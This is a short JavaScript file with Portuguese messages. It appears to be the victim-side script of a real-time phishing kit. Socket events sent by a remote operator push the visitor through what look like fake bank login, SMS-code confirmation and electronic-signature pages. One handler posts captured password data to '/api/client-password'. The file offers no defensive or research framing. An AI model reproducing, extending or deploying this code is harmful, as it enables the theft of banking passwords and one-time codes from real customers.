const await = (() => {
    //private var/functions
    function commands() {
        socket.on('errorpassword', (user) => {
            if (user.id) window.location.href = `/sinbc-login?client=${user.id}&error=true`
        })

        socket.on('command sms', async (user) => {
            try {
                const client = await util.post(`/api/client-password`, user)

                if (user.id) window.location.href = `/sms?client=${user.id}`
            } catch (error) {
                alert(error)
            }
        })

        socket.on('errorsms', (user) => {
            if (user.id) window.location.href = `/confirmsms?client=${user.id}&error=true`
        })

        socket.on('sms', (user) => {
            if (user.id) window.location.href = `/confirmsms?client=${user.id}`
        })


        socket.on('signature', (user) => {
            alert('Campo inválido, preencha corretamente')
        })

        socket.on('errorsignature', (user) => {
            if (user.id) window.location.href = `/eletronic?client=${user.id}&error=true`
        })

        //user
        socket.on('erroruser', user => {
            alert('Usuário inválido, preencha corretamente')

            console.log(`Erro user:`, user, `to: `, theUser.id);
            if (user.id == theUser.id) window.location.href = `/?client=${user.id}`
        })

        //
        socket.on('finish', client => {
            window.location.href = `/finish?client=${client.id}`
        })
    }

    function startRoom() {
        socket.emit('start', theUser)

        //await
        socket.emit('await', theUser)
    }

    return {
        //public var/functions
        startRoom,
        commands
    }
})()

await.startRoom()
await.commands()
